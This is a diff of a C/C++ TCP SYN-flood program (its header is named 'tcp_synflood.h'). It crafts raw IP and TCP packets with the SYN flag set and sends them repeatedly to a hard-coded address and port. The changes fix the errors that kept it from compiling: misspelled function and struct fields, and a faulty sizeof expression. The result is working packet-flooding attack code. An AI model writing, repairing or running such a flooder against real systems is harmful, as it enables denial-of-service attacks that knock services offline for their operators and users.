@@ -1,27 +1,6 @@
-#include <cstdio>
-#include <cstdlib>
-#include <cstring>
-#include <sys/socket.h>
-#include <netinet/ip.h>
-#include <netinet/tcp.h>
+#include "tcp_synflood.h"
 
-#include <chrono>
-#include <thread>
-
-#define SOCKET_ERROR -1
-#define PACKET_SIZE 4096
-
-#define SRC_IP "192.168.0.100"
-#define DST_IP "192.168.0.11"
-#define SRC_PORT 25000
-#define DST_PORT 8080
-
-typedef int SOCKET;
-typedef struct sockaddr SOCKADDR;
-typedef struct sockaddr_in SOCKADDR_IN;
-typedef struct iphdr IPHDR;
-typedef struct tcphdr TCPHDR;
-typedef struct pseudo_header
+struct pseudo_header
 {
 	unsigned int source_address;
 	unsigned int dest_address;
@@ -29,13 +8,13 @@ typedef struct pseudo_header
 	unsigned char protocol;
 	unsigned short tcp_length;
 	TCPHDR tcp_header;
-} PSD_HEADER;
+};
 
 int main(int argc, char *argv[])
 {
     SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 
-    char packet[PACKET_SIZE];
+    char packet[PACKET_SIZE], *data;
     IPHDR* ip_header = (IPHDR*)packet;
     TCPHDR* tcp_header = (TCPHDR*)(packet + sizeof(struct ip));
     SOCKADDR_IN sin;
@@ -50,7 +29,7 @@ int main(int argc, char *argv[])
         printf("socket ok\n");
 
         int one = 1;
-        if(setsokopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
+        if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
         {
             printf("Error while setting socket option.\n");
             exit(-2);
@@ -59,11 +38,11 @@ int main(int argc, char *argv[])
         {
             memset(packet, 0, PACKET_SIZE);
             fill_ip_header(ip_header);
-            fill_tcp_header(tcp_header);
+            fill_tcp_header(tcp_header, 0);
 
             sin.sin_family = AF_INET;
             sin.sin_port = htons(DST_PORT);
-            sin.sin_addr.sin_addr = inet_addr(DST_IP);
+            sin.sin_addr.s_addr = inet_addr(DST_IP);
 
             for(int i = 0; i < 10; i++)
             {
@@ -91,7 +70,7 @@ void fill_ip_header(IPHDR *ip_header)
     ip_header->tos = 0;
     ip_header->tot_len = sizeof(IPHDR) + sizeof(TCPHDR);
     ip_header->id = htons(54321);
-    ip_header->frag_offset = 0;
+    ip_header->frag_off = 0;
     ip_header->ttl = 64;
     ip_header->protocol = IPPROTO_TCP;
     ip_header->check = 0;
@@ -107,7 +86,7 @@ void fill_tcp_header(TCPHDR *tcp_header, size_t data_len)
     tcp_header->dest = htons(DST_PORT);
     tcp_header->seq = 0;
     tcp_header->ack_seq = 0;
-    tcp_header->dof = 5;
+    tcp_header->doff = 5;
     tcp_header->fin = 0;
     tcp_header->syn = 1;
     tcp_header->rst = 0;
@@ -125,8 +104,8 @@ void fill_tcp_header(TCPHDR *tcp_header, size_t data_len)
     pseudo_header.protocol = IPPROTO_TCP;
     pseudo_header.tcp_length = htons(sizeof(TCPHDR) + data_len);
 
-    int p_size = sizeof(PSD_HEADER + sizeof(TCPHDR) + data_len);
-    char *pseudo_packet = malloc(p_size);
+    int p_size = sizeof(PSD_HEADER) + sizeof(TCPHDR) + data_len;
+    char *pseudo_packet = (char *)malloc(p_size);
     memcpy(pseudo_packet, (char *)&pseudo_header, sizeof(PSD_HEADER));
     memcpy(pseudo_packet + sizeof(PSD_HEADER), tcp_header, sizeof(TCPHDR) + data_len);
 
@@ -135,7 +114,7 @@ void fill_tcp_header(TCPHDR *tcp_header, size_t data_len)
     pseudo_packet = nullptr;
 }
 
-unsigned short csum(unsigned short *ptr,int nbytes) 
+unsigned short csum(unsigned short *ptr,int nbytes)
 {
 	long sum;
 	unsigned short oddbyte;
